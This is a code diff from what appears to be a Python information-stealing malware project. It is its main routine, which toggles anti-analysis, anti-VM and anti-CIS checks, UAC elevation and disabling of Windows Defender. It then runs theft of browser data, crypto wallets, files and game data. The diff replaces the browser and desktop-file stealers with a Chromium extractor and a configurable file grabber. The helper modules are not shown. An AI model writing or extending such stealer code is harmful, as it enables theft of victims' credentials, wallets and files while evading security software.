@@ -10,8 +10,8 @@ from modules.screan_shot.screan_shot import screan_shot
 from modules.antianalysis.check_analysis import Anti_Analysis
 from modules.antivirus.antivirus import deseble_defander
 from modules.antiVM.antiVM import AntiVm
-from modules.Browsers.Browser import Walkthrough#
-from modules.client_files.client_files import steal_desktop_txt_file
+from modules.Browsers.chromium_base.Browser import chromium_extractor#
+from modules.file_grabber.file_grabber import file_grabber_fun
 from modules.software_files.games.games import gamesSteal
 import modules.installed_software.instaled_Software as installed_software
 from modules.system.systemInfo import getOS
@@ -39,9 +39,11 @@ from vic_config import config
 def main() -> None:
     
     if config.get("checkAnalysis") == 1:
-            Anti_Analysis() # anti analysis
+        Anti_Analysis() # anti analysis
+
     if config.get("antiVM") == 1:
         AntiVm() # anti vm
+
     if config.get("antiCIS") == 1:
         anti_cis(config.get("BLACKLIST")) # anti cis
         
@@ -50,7 +52,6 @@ def main() -> None:
         
     if config.get("UACAdmin") == 1:
         run_as_admin() # run as admin
-        
         
     if config.get("defenderDisable") == 1:
         deseble_defander()
@@ -67,13 +68,14 @@ def main() -> None:
         
     async def _run_all_functions() -> None:
         if config.get("extractBrowsersData") == 1:
-            Walkthrough(result_log_dir)
+            chromium_extractor(result_log_dir)
             
         if config.get("extractWallets") == 1:
             Wallets(result_log_dir)
-            
+
+        
         if config.get("extractFiles") == 1:
-            steal_desktop_txt_file(result_log_dir)
+            file_grabber_fun(result_log_dir, config.get("FileGrabber"))# this function is not a debug
             
         if config.get("extractGameData") == 1:
             gamesSteal(result_log_dir)
